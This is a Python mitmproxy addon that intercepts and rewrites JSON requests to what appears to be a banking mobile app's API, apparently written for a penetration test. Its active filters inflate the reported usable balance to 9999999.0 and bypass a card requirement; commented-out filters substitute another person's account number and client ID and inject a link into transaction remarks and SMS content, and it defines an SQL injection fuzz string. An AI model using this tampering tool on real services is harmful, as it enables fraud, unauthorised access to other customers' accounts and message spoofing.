from typing import Callable, Protocol
import mitmproxy
import mitmproxy.http
import mitmproxy.ctx as ctx
import json
from utils.mysm4 import sm4_decrypt_ecb, sm4_encrypt_ecb
import clipboard

sqlFuzz = "'\"#()--"


class Filter(Protocol):
    def check(obj) -> bool: ...
    def modify(obj) -> object: ...
class FilterChain:
    def __init__(self) -> None:
        self.filters: list[Filter] = list()

    def add(self, filters: list[Filter]):
        self.filters.extend(filters)

    def doFilter(self, obj) -> object:
        obj_current = obj
        for filter in self.filters:
            if filter.check(obj_current):
                obj_current = filter.modify(obj_current)
        return obj_current


class RequestFilter(Filter):
    def __init__(
        self,
        methods: list[str],
        func: Callable[
            [
                object,
            ],
            object,
        ],
    ) -> None:
        self.methods: list[str] = methods
        self.func: Callable[
            [
                object,
            ],
            object,
        ] = func

    def check(self, obj) -> bool:
        try:
            for s in self.methods:
                if s == "*":
                    return True
                elif str(obj["method"]).endswith(s):
                    return True
            return False
        except KeyError:
            return False

    def modify(self, obj) -> object:
        try:
            return self.func(obj)
        except KeyError:
            pass


class ResponseFilter(Filter):
    def __init__(
        self,
        func: Callable[
            [
                object,
            ],
            object,
        ],
    ) -> None:
        self.func: Callable[
            [
                object,
            ],
            object,
        ] = func

    def check(self, obj) -> bool:
        ctx.log(obj, "warn")
        return True

    def modify(self, obj) -> object:
        try:
            return self.func(obj)
        except KeyError:
            pass


def modify_dict(obj: dict, key: str, value, add=False) -> object:
    if not add and key not in obj:
        return obj
    try:
        obj[key] = value
        return obj
    except KeyError:
        return obj


filterChain = FilterChain()

filterChain.add(
    [
        # RequestFilter(
        #     [
        #         "acctTransQuery.do",
        #     ],
        #     lambda obj: modify_dict(obj, "acctno", "6224490110801981"),
        # ),
        # RequestFilter(
        #     [
        #         "acctTransQuery.do",
        #     ],
        #     lambda obj: modify_dict(obj, "CLIENT_NO", "db55df74a18ee537"),
        # ),
        # RequestFilter(
        #     [
        #         "acctTransQuery.do",
        #     ],
        #     lambda obj: modify_dict(obj, "stdate", "20200407"),
        # ),
        # RequestFilter(
        #     [
        #         "sheBaoSign.do",
        #     ],
        #     lambda obj: modify_dict(obj, "CLIENT_NO", "db55df74a18ee537"),
        # ),
        # RequestFilter(
        #     [
        #         "sheBaoSign.do",
        #     ],
        #     lambda obj: modify_dict(obj, "aab301", "330701"),
        # ),
        # RequestFilter(
        #     [
        #         "*",
        #     ],
        #     lambda obj: modify_dict(obj, "CLIENT_NO", "db55df74a18ee537"),
        # ),
        RequestFilter(
            [
                "*",
            ],
            lambda obj: modify_dict(obj, "USA_BLE_BAL", "9999999.0"),
        ),
        RequestFilter(
            [
                "qryDepositAcctList.do",
            ],
            lambda obj: modify_dict(obj, "NoNeedCard", "Y"),
        ),
        # RequestFilter(
        #     [
        #         "*",
        #     ],
        #     lambda obj: modify_dict(obj, "TRANS_REMARK", "https://www.nsfocus.com"),
        # ),
        # RequestFilter(
        #     [
        #         "*",
        #     ],
        #     lambda obj: modify_dict(
        #         obj, "smsContent", "SMS Content Hacked: https://www.nsfocus.com"
        #     ),
        # ),
    ]
)

resFilterChain = FilterChain()
resFilterChain.add(
    [
        ResponseFilter(lambda obj: modify_dict(obj, "USA_BLE_BAL", "9999999.0")),
    ]
)


def log(msg: str):
    ctx.log(msg, "warn")


class Interceptor:
    def __init__(self) -> None:
        pass

    def load(self, loader):
        ctx.options.console_eventlog_verbosity = "warn"

    def request(self, flow: mitmproxy.http.HTTPFlow):
        obj = json.loads(flow.request.text)
        obj["method"] = flow.request.headers["Operation-Type"]
        # ctx.log(obj, "warn")
        if flow.request.path.__contains__("request"):
            filterChain.doFilter(obj)
        else:
            resFilterChain.doFilter(obj)
        del obj["method"]
        flow.request.text = json.dumps(obj)
        pass

    def response(self, flow: mitmproxy.http.HTTPFlow):
        pass


addons = [Interceptor()]
